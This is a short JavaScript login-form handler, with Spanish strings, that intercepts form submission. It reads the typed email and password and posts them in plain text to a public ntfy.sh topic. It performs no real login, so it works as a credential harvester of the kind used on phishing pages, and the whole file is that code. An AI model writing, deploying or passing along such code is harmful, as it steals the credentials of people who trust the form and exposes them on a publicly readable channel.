document.getElementById('loginForm').addEventListener('submit', async (e) => {
  e.preventDefault();

  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;

  const message = `Intento de login:\nCorreo: ${email}\nContraseña: ${password}`;

  try {
    await fetch('https://ntfy.sh/alert', {
      method: 'POST',
      headers: { 'Content-Type': 'text/plain' },
      body: message
    });
    alert("Login enviado vía ntfy!");
  } catch (err) {
    alert("Error al enviar a ntfy.");
    console.error(err);
  }
});
